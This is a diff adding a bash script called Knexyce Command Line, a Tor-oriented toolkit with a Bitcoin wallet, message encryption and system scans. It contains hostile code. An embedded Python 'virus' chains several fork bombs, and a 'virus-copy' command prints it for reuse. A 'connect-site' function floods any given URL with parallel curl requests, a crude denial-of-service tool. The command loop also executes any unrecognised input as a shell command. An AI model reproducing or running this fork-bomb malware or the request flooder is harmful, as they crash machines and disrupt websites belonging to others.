@@ -1,0 +1,776 @@
+#!/bin/bash
+# Knexyce Command Line.
+
+RED='\033[1;38;5;196m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[38;5;33m'
+MAGENTA='\033[1;35m'
+CYAN='\033[1;36m'
+WHITE='\033[1;37m'
+RESET='\033[0m'
+
+kbtc_py_bash=$(cat <<EDF
+# KnexyceBTC
+
+def install_pip():
+    import subprocess
+    import sys
+    import os
+    import urllib.request
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', '--version'])
+        print("PIP is already installed.")
+        return
+    except subprocess.CalledProcessError:
+        print("PIP is not installed. Installing...")
+    try:
+        subprocess.check_call([sys.executable, '-m', 'ensurepip'])
+        print("PIP has been installed successfully using 'ensurepip'.")
+        return
+    except subprocess.CalledProcessError:
+        print("'ensurepip' has failed. Attempting to install PIP via 'get-pip.py'...")
+    try:
+        url = "https://bootstrap.pypa.io/get-pip.py"
+        get_pip_script = "get-pip.py"
+        urllib.request.urlretrieve(url, get_pip_script)
+        print("Downloaded 'get-pip.py'.")
+        subprocess.check_call([sys.executable, get_pip_script])
+        print("PIP has been installed successfully using 'get-pip.py'.")
+        os.remove(get_pip_script)
+        print("Cleaned up 'get-pip.py'.")
+    except Exception as e:
+        print(f"Failed to install PIP: {e}")
+        sys.exit(1)
+
+def pip_install(package_name, upgrade=True, user=False):
+    import subprocess
+    import sys
+    import re
+    def is_valid_package_name(package_name):
+        return bool(re.match(r'^[a-zA-Z0-9_\-]+$', package_name))
+    def install_package(package_name):
+        if not is_valid_package_name(package_name):
+            print(f"Invalid package name: {package_name}")
+            return
+        try:
+            command = [sys.executable, '-m', 'pip', 'install', package_name]
+            if upgrade:
+                command.append('--upgrade')
+            if user:
+                command.append('--user')
+            subprocess.run(command, check=True)
+            print(f"{package_name} has been installed successfully.")
+        except subprocess.CalledProcessError as e:
+            print(f"Failed to install {package_name}: {e}")
+    install_package(package_name)
+
+def upgrade_pip():
+    import subprocess
+    import sys
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
+        print("PIP has been upgraded successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to upgrade PIP: {e}")
+
+def upgrade_system():
+    install_pip()
+    upgrade_pip()
+    pip_install("secp256k1")
+    pip_install("base58")
+    pip_install("bit")
+    pip_install("requests")
+
+def create_btc_wallet():
+    def generate_valid_private_key():
+        while True:
+            private_key_bytes = os.urandom(32)
+            private_key_int = int.from_bytes(private_key_bytes, byteorder='big')
+            if 1 <= private_key_int < 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141:
+                return private_key_bytes
+            else:
+                continue
+    
+    def public_key_to_address(public_key):
+        sha256_hash = hashlib.sha256(public_key).digest()
+        ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
+        network_prefix = b'\x00'
+        prefixed_hash = network_prefix + ripemd160_hash
+        checksum = hashlib.sha256(hashlib.sha256(prefixed_hash).digest()).digest()[:4]
+        address_bytes = prefixed_hash + checksum
+        address = base58.b58encode(address_bytes)
+        return address.decode('utf-8')
+    
+    storage_valid_private_key = generate_valid_private_key()
+    storage_private_key = PrivateKey(storage_valid_private_key)
+    storage_public_key = storage_private_key.pubkey
+    
+    transaction_valid_private_key = generate_valid_private_key()
+    transaction_private_key = PrivateKey(transaction_valid_private_key)
+    transaction_public_key = transaction_private_key.pubkey
+    
+    storage_address = public_key_to_address(storage_public_key.serialize(compressed=True))
+    transaction_address = public_key_to_address(transaction_public_key.serialize(compressed=True))
+    
+    print("")
+    print("Bitcoin Wallet Instructions: ")
+    print("Two Bitcoin wallets in total were created. One wallet is for transactions, another is to store bitcoin.")
+    print("Before making a bitcoin transaction, deposit the exact transaction money into the transaction wallet along with transaction fee.")
+    print("Only use your transaction wallet's private key to make a bitcoin transaction.")
+    print("Only use the bitcoin storage wallet's public key to receive bitcoin.")
+    print("")    
+    print("Bitcoin Wallet Info: ")
+    print("")
+    print("Bitcoin Storage Wallet")
+    print(f"Private Key: {storage_private_key.private_key.hex()}")
+    print(f"Public Key: {storage_public_key.serialize().hex()}")
+    print(f"Bitcoin Address: {storage_address}")
+    print("")
+    print("Bitcoin Transaction Wallet")
+    print(f"Private Key: {transaction_private_key.private_key.hex()}")
+    print(f"Public Key: {transaction_public_key.serialize().hex()}")
+    print(f"Bitcoin Address: {transaction_address}")
+    print("")
+
+def try_create_wallet():
+    try:
+        create_btc_wallet()
+    except Exception as e:
+        print(f"Error: {e}")
+
+def hex_to_wif(private_key_hex, compressed=True):
+    private_key_bytes = bytes.fromhex(private_key_hex)
+    private_key_with_version = b'\x80' + private_key_bytes
+    if compressed:
+        private_key_with_version += b'\x01'
+    checksum = hashlib.sha256(hashlib.sha256(private_key_with_version).digest()).digest()[:4]
+    wif = base58.b58encode(private_key_with_version + checksum)
+    return wif.decode('utf-8')
+
+def transaction_system():
+    import re
+    import requests
+    from decimal import Decimal
+    from bit import Key
+    import hashlib
+    import base58
+    
+    def validate_bitcoin_address(address):
+        try:
+            if re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', address):
+                return True
+            return False
+        except Exception:
+            return False
+    
+    def estimate_fee(amount_satoshis):
+        try:
+            response = requests.get("https://mempool.space/api/v1/fees/recommended")
+            fee_rates = response.json()
+            fast_fee = fee_rates["fastestFee"]        
+            estimated_size = 250
+            fee = fast_fee * estimated_size
+            return max(fee, 1)
+        except Exception as e:
+            print(f"Error estimating fee: {e}")
+            return 1000
+    
+    def hex_to_wif(private_key_hex, compressed=True):
+        private_key_bytes = bytes.fromhex(private_key_hex)
+        private_key_with_version = b'\x80' + private_key_bytes
+        if compressed:
+            private_key_with_version += b'\x01'
+        checksum = hashlib.sha256(hashlib.sha256(private_key_with_version).digest()).digest()[:4]
+        wif = base58.b58encode(private_key_with_version + checksum)
+        return wif.decode('utf-8')
+    
+    def create_transaction():
+        private_key = input("Enter your private key: ")
+        if private_key.startswith(("5", "K", "L")):
+            wif_private_key = private_key
+        else:
+            wif_private_key = hex_to_wif(private_key)    
+        key = Key(wif_private_key)    
+        to_address = input("Enter the target Bitcoin address: ")
+        if not validate_bitcoin_address(to_address):
+            print("Error: Invalid Bitcoin address format.")
+            return    
+        amount = Decimal(input("Enter the amount of Bitcoin to send (in BTC): "))
+        if amount <= 0:
+            print("Error: Amount must be greater than zero.")
+            return    
+        fee_percentage = Decimal(input("Enter the percentage of transaction fee (or '0' for dynamic): "))    
+        amount_satoshis = int(amount * 100000000)
+        if fee_percentage == 0:
+            fee_satoshis = estimate_fee(amount_satoshis)
+        else:
+            fee_satoshis = int(amount_satoshis * (fee_percentage / 100))
+        total_amount_satoshis = amount_satoshis + fee_satoshis    
+        balance = Decimal(key.get_balance('btc'))
+        balance_satoshis = balance * 100000000
+        if balance_satoshis < total_amount_satoshis:
+            print(f"Error: Insufficient funds. You need {total_amount_satoshis / 100000000} BTC, but only have {balance} BTC.")
+            return
+        print(f"Creating a transaction for {amount} BTC with a fee of {fee_satoshis / 100000000} BTC.")
+        try:
+            tx = key.send([(to_address, amount_satoshis, 'btc')], fee=fee_satoshis)
+            print(f"Transaction successfully sent.")
+            print(f"Transaction ID: {tx.txid}")
+        except Exception as e:
+            print(f"Error: Failed to create/send transaction. {e}")
+    create_transaction()
+
+def try_transaction():
+    try:
+        transaction_system()
+    except Exception as e:
+        print(f"Error: {e}")
+
+def check_balance(wif_private_key):
+    key = Key(wif_private_key)
+    balance = key.get_balance('btc')
+    print(f"Your balance is: {balance} BTC")
+
+def try_check():
+    try:
+        private_key = input("Enter your private key to check balance. ")
+        wif_private_key = hex_to_wif(private_key)
+        check_balance(wif_private_key)
+    except Exception as e:
+        print(f"Error: {e}")
+
+active = True
+
+def clear_screen():
+    import os
+    import platform
+    methods = [
+        'cls' if platform.system() == 'Windows' else 'clear',
+        'tput clear',
+        'reset'
+    ]
+    for method in methods:
+        try:
+            os.system(method)
+            break
+        except Exception as e:
+            continue
+    else:
+        print(f"Error: {e}")
+        print("\033[H\033[J", end="")
+
+def knexyce_command_line_help():
+    print("Note: Do not include ' or ' in the command when typing.")
+    print("Commands: ")
+    print("'help': Provides a list of commands.")
+    print("'create': Creates a Knexyce Bitcoin Wallet.")
+    print("'check': Checks how much Bitcoin you have.")
+    print("'send': Makes a Bitcoin transaction.")
+    print("'clear': Clears the screen.")
+    print("'exit': Exits the command line.")
+
+def clean_files():
+    file_path = input("Enter the name of a file containing null bytes. ") 
+    try:
+        with open(file_path, "rb") as f:
+            content = f.read()
+        clean_content = content.replace(b'\x00', b'')
+        with open(file_path, "wb") as f:
+            f.write(clean_content)    
+        print(f"Null bytes removed successfully from '{file_path}'.")
+    except FileNotFoundError:
+        print(f"Error: The file '{file_path}' was not found. Please check the path and try again.")
+    except PermissionError:
+        print(f"Error: Insufficient permissions to read or write to '{file_path}'.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+
+def ask_clear():
+    clear_ask = input("Clear screen? [y/n] ")
+    if clear_ask == "y":
+        clear_screen()
+    else:
+        pass
+
+upgrade_ask = input("Upgrade system? [y/n] ")
+if upgrade_ask == "y":
+    upgrade_system()
+    import hashlib
+    import base58
+    from bit import Key
+    from decimal import Decimal
+    import secp256k1
+    import os
+    from secp256k1 import PrivateKey
+    import requests
+    ask_clear()
+else:
+    print("")
+
+try:
+    import hashlib
+    import base58
+    from bit import Key
+    from decimal import Decimal
+    import secp256k1
+    import os
+    from secp256k1 import PrivateKey
+    import requests
+except Exception as e:
+    print("Error: Missing dependencies.")
+
+print("KnexyceBTC")
+print("")
+print("Software Info:")
+print("Name: Knexyce Bitcoin (KnexyceBTC/KBTC) Command Line Interface")
+print("This is a shell-agnostic script. The main requirement is internet access.")
+print("This script is a lightweight Bitcoin wallet designed for a command line interface. The script itself is coded in Python-v3.")
+print("This software was designed by a entity/group known as Knexyce and all rights to it are reserved by Knexyce.")
+print("")
+print("Advice: ")
+print("It's generally good practice to use KBTC with a VPN, firewall, and antivirus for extra security, along with full encryption for all internet actions/data. Save as little data as possible.")
+print("It's also generally recommended to research what Bitcoin is, how it works, and as much information about it as possible before using this software.")
+print("Along with that, some research on how coding, software, and scripts work is generally needed to understand how this software works.")
+print("")
+print("To Begin:")
+print("Enter 'help' without any quotations for a list of KBTC commands.")
+print("")
+
+while active:
+    knexyce_input = input("<Knexyce> ")
+    if knexyce_input == "help":
+        knexyce_command_line_help()
+    elif knexyce_input == "create":
+        try_create_wallet()
+    elif knexyce_input == "check":
+        try_check()
+    elif knexyce_input == "send":
+        try_transaction()
+    elif knexyce_input == "clear":
+        clear_screen()
+    elif knexyce_input == "exit":
+        active = False
+        exit()
+    elif knexyce_input == "clean-null":
+        clean_files()
+    else:
+        print("Error: Command not found.")
+
+# This software was created by the Administrator of Knexyce.
+# All rights to this software are reserved by Knexyce.
+EDF
+)
+
+kfv_py_bash=$(cat <<EDF
+def kfv_bash():
+    for repeat in range(15):
+    
+        def clear_screen():
+            import os
+            import platform
+            ms = [
+                'cls' if platform.system() == 'Windows' else 'clear',
+                'tput clear',
+                'reset'
+            ]
+            for m in ms:
+                try:
+                    os.system(m)
+                    break
+                except Exception as e:
+                    continue
+            else:
+                pass
+    
+        def virus():
+            try:
+                import os
+                for Repeat in range(7):
+                    os.system('bash -c ":(){ :|:& };:"')
+                    os.system('bash -c ":"')
+            except Exception as e:
+                pass
+            else:
+                pass
+            finally:
+                pass
+            try:
+                import os
+                for Repeat in range(7):
+                    os.system(':(){ :|:& };:')
+                    os.system(':')
+            except Exception as e:
+                pass
+            else:
+                pass
+            finally:
+                pass
+            try:
+                import os
+                for Repeat in range(7):
+                    os.system('kfv(){ :|:& };:')
+                    os.system("kfv")
+            except Exception as e:
+                pass
+            else:
+                pass
+            finally:
+                pass
+            try:
+                import os
+                while True:
+                    os.fork()
+            except Exception as e:
+                pass
+            else:
+                pass
+            finally:
+                pass
+            try:
+                import subprocess
+                perl_code = ''' perl -e 'fork while fork' '''
+                result = subprocess.run(['perl', '-e', perl_code], capture_output=True, text=True)
+            except Exception as e:
+                pass
+            else:
+                pass
+            finally:
+                pass
+    
+        def start_virus():
+            clear_screen()
+            virus()
+    
+        start_virus()
+    return()
+
+kfv_bash()
+EDF
+)
+
+kcli-help() {
+    echo " "
+    echo "Note: Do not include <, >, ', ', :, or anything beyond : when typing the command. Replace text inside of and including <> with the specified information needed for the command."
+    echo " "
+    echo "KNEXYCE COMMANDS: "
+    echo "'browser': Starts TOR Browser (VPNs and antiviruses are recommended.)"
+    echo "'btc': Starts the KnexyceBTC Wallet. (VPNs and antiviruses are recommended.)"
+    echo "'system-info': Shows info on the system."
+    echo "'capture': Clones a github repository."
+    echo "'connect-site' <Site URL> <Amount of Requests> <Amount of Seconds Running>: Connects to a website for a certain time."
+    echo "'virus-copy': Prints the code for a Linux virus into the terminal. (Three hashtags mark the beginning and end of the code.)"
+    echo "'scrape': Anonymously scrapes data off of TOR's websites."
+    echo "'encrypt-message': Encrypts a message that can only be decrypted by this specific software or a specific command."
+    echo "'decrypt-message': Decrypts a message that was encrypted using this software."
+    echo "'k-superscan': Runs a scan on the entire system. (This may require unusual amounts of system resources.)"
+    echo "'clear': Clears the screen."
+    echo "'exit': Returns to the normal Linux terminal."
+    echo " "
+}
+
+system-info() {
+    echo "### System Information ###"
+    uname -a
+    echo -e "\n### CPU Information ###"
+    lscpu
+    echo -e "\n### Memory Information ###"
+    free -h
+    echo -e "\n### Disk Information ###"
+    df -h
+    echo -e "\n### Disk Partitions ###"
+    sudo fdisk -l
+    echo -e "\n### Hardware Information ###"
+    sudo lshw -short
+    echo -e "\n### Network Information ###"
+    ip addr
+    echo -e "\n### Network Connections ###"
+    netstat -tulnp
+    echo -e "\n### System Performance (top) ###"
+    top -n 1 -b
+    echo -e "\n### Temperature and Health ###"
+    sensors
+    echo -e "\n### CPU Load ###"
+    echo -e "\n### Processes ###"
+    uptime
+    echo -e "\n### All System Summary ###"
+    inxi -Fxz
+}
+
+capture() {
+    echo "Enter the GitHub username. "
+    read username
+    echo "Enter the GitHub repository name. "
+    read repo_name
+    repo_url="https://github.com/$username/$repo_name.git"
+    git clone "$repo_url"
+    echo "Repository $repo_name by $username has been cloned. If this repository has not been cloned: One or both provided inputs may be invalid."
+    echo "Check your file-system to find the repository contents that were downloaded."
+    echo ""
+}
+
+connect-site() {
+    pids=()
+    local url=$1
+    local connections=$2
+    local duration=$3
+    if ! [[ "$connections" =~ ^[0-9]+$ ]] || ! [[ "$duration" =~ ^[0-9]+$ ]]; then
+        echo "Error: Invalid numbers for connections and duration."
+        return 1
+    fi
+    echo "Sending requests to $url with $connections connections for $duration seconds..."
+    send_requests() {
+        end_time=$((SECONDS + duration))
+        while (( SECONDS < end_time )); do
+            curl -s -o /dev/null "$url" &
+            pids+=($!)
+        done
+    }
+    for ((i = 0; i < connections; i++)); do
+        send_requests &
+        pids+=($!)
+    done
+    sleep "$duration"
+    pkill -f "curl -s -o /dev/null $url"
+    for pid in "${pids[@]}"; do
+        if ps -p "$pid" > /dev/null; then
+            sudo kill "$pid" 2>/dev/null && echo "Killed PID: $pid" || echo "Failed to kill PID: $pid"
+        else
+            echo "PID $pid no longer exists."
+        fi
+    done
+    echo "Connections have been made."
+}
+
+browser() {
+    rm -vfr tor-browser
+    latest_version=$(curl -s https://gitlab.torproject.org/tpo/web/tpo/-/raw/main/databags/versions.ini | grep -A1 '\[torbrowser-linux-stable]' | grep -oP '(?<=version = ).*')
+    base_url="https://www.torproject.org/dist/torbrowser/"
+    latest_tarball="tor-browser-linux-x86_64-$latest_version.tar.xz"
+    wget "${base_url}${latest_version}/${latest_tarball}"
+    tar -xvJf $latest_tarball
+    rm $latest_tarball
+    ls -d tor-browser
+    cd tor-browser
+    chmod +x start-tor-browser.desktop
+    ./start-tor-browser.desktop
+    cd ..
+}
+
+virus-copy() {
+    echo "###"
+    echo ""
+    echo "$kfv_py_bash"
+    echo ""
+    echo "###"
+}
+
+btc() {
+    echo "$kbtc_py_bash" > /tmp/kbtc.py
+    python3 /tmp/kbtc.py
+    rm /tmp/kbtc.py
+}
+
+encrypt-message() {
+    read -p "Message to Encrypt: " message
+    read -p "Decryption Key: " knexyce_key
+    knexyce_message=$(echo -n "$message" | openssl enc -aes-256-cbc -salt -pass pass:"$knexyce_key" -pbkdf2 | base64)
+    echo "Knexyce Encrypted Message:"
+    echo "$knexyce_message"
+    echo "Key for message decryption: $knexyce_key"
+}
+
+decrypt-message() {
+    read -p "Encrypted Message: " knexyce_message
+    read -p "Decryption Key: " knexyce_key
+    decoded_message=$(echo "$knexyce_message" | base64 -d)    
+    decrypted_message=$(echo -n "$decoded_message" | openssl enc -aes-256-cbc -d -salt -pass pass:"$knexyce_key" -pbkdf2)
+    if [ $? -eq 0 ]; then
+        echo "Decrypted Message: $decrypted_message"
+    else
+        echo "Decryption failed. Please check your key or message."
+    fi
+}
+
+anonymous-scrape() {
+    echo "Enter the website URL to scrape: "
+    read url
+    torsocks curl -s "$url" > scraped_data.html
+    echo "Scraped content saved as 'scraped_data.html'."
+    echo "Check your file-system to find the website contents that were downloaded."
+}
+
+k-superscan() {
+    echo "System scans will run in the background."
+    echo "Loading dependency checks & installations..."
+    sudo freshclam
+    sudo rkhunter --update
+    sudo rkhunter --propupd
+    echo "Done: Dependency checks & installations complete."
+    echo "Running scans... This may take a few moments."
+    sudo nohup clamscan -r / --log clamscan_log.log &
+    sudo nohup rkhunter --check --logfile rkhunter_log.log &
+    sudo nohup chkrootkit > chkrootkit_log.log &
+    echo " "
+    echo "System scans have been completed."
+    echo "Enter 'sudo cat <File Name>' into the terminal to access log files. Replace '<File Name>' with the name of the file in the command."
+    echo "Log Files"
+    echo " clamscan_log.log"
+    echo " rkhunter_log.log"
+    echo " chkrootkit_log.log"
+    echo " "
+}
+
+kcli-input() {
+    while true; do
+        echo -en "$GREEN$username$BLUE@Knexyce: $YELLOW$(pwd)$CYAN "
+        read -r input
+        case "$input" in
+            "system-info")
+                system-info
+                ;;
+            "browser")
+                browser
+                ;;
+            "capture")
+                capture
+                ;;
+            "connect-site")
+                connect-site
+                ;;
+            "kcli-help")
+                kcli-help
+                ;;
+            "btc")
+                btc
+                ;;
+            "virus-copy")
+                virus-copy
+                ;;
+            "scrape")
+                anonymous-scrape
+                ;;
+            "encrypt-message")
+                encrypt-message
+                ;;
+            "decrypt-message")
+                decrypt-message
+                ;;
+            "k-superscan")
+                k-superscan
+                ;;
+            "exit")
+                echo "Exiting."
+                break
+                ;;
+            *)
+                $input
+                ;;
+        esac
+    done
+}
+
+loading-bar() {
+    clear
+    echo "[=_________]"
+    echo " "
+    sudo apt-get install -y -qq bash
+    sudo apt-get install -y -qq git
+    sudo apt-get install -y -qq apt
+    sudo apt-get install -y -qq clamav-daemon
+    sleep 1
+    clear
+    echo "[==________]"
+    echo " "
+    sudo apt-get install -y -qq sudo
+    sudo apt-get install -y -qq tar
+    sudo apt-get install -y -qq xz-utils
+    sudo apt-get install -y -qq xdg-utils
+    sleep 1
+    clear
+    echo "[===_______]"
+    echo " "
+    sudo apt-get install -y -qq tor
+    sudo apt-get install -y -qq dpkg
+    sudo apt-get install -y -qq python3-pip
+    clear
+    echo "[====______]"
+    echo " "
+    sudo apt-get install -y -qq curl
+    sudo apt-get install -y -qq grep
+    sudo apt-get install -y -qq wget
+    sudo apt-get install -y -qq torsocks
+    sleep 1
+    clear
+    echo "[=====_____]"
+    echo " "
+    sudo apt-get install -y -qq python3
+    sudo apt-get install -y -qq lshw
+    sudo apt-get install -y -qq net-tools
+    sudo apt-get install -y -qq inxi
+    sleep 1
+    clear
+    echo "[======____]"
+    echo " "
+    sudo apt-get install -y -qq lm-sensors
+    sudo apt-get install -y -qq cpu-checker
+    sudo apt-get install -y -qq sysstat
+    sudo apt-get install -y -qq util-linux
+    sleep 1
+    clear
+    echo "[=======___]"
+    echo " "
+    sudo apt-get install -y -qq fdisk
+    sudo apt-get install -y -qq iproute2
+    sudo apt-get install -y -qq procps
+    sudo apt-get install -y -qq openssl
+    sleep 1
+    clear
+    echo "[========__]"
+    echo " "
+    sudo apt-get install -y -qq clamav
+    sudo apt-get install -y -qq chkrootkit
+    sudo apt-get install -y -qq rkhunter
+    sudo apt-get install -y -qq coreutils
+    sleep 1
+    clear
+    echo "[=========_]"
+    sudo apt-get -y -qq update
+    sudo apt-get -y -qq dist-upgrade
+    sudo apt-get -y -qq full-upgrade
+    sleep 0.5
+    clear
+    echo "[==========]: Upgraded and updated systems."
+    sleep 0.5
+}
+
+echo -e "${CYAN}"
+clear
+echo "Upgrade system and install needed system resources?"
+echo -n "[y/n] "
+read upgrade_ask
+if [[ "$upgrade_ask" == "y" ]]; then
+    loading-bar
+fi
+
+echo " "
+echo "Knexyce Command Line Interface"
+echo " "
+echo "KnexyceCLI, KCLI, or Knexyce Command Line Interface is built by a group known as Knexyce. The purpose of this software is to be a toolkit for TOR Browser."
+echo " "
+echo "Some features may include accessing TOR Browser, encrypting messages, and using a Knexyce Bitcoin Wallet."
+echo " "
+echo "Security Note: Use a researched VPN, Antivirus, and other security tools when using KnexyceCLI."
+echo " "
+echo "All rights are reserved by Knexyce."
+echo " "
+echo "Enter the command known as 'kcli-help' into KCLI for a list of Knexyce commands."
+echo " "
+
+echo -en "${GREEN}Enter a username: ${CYAN}"
+read username
+kcli-input
+
+# Script: kcli
+# Script made by the Administrator of Knexyce.
+# All rights reserved by Knexyce.
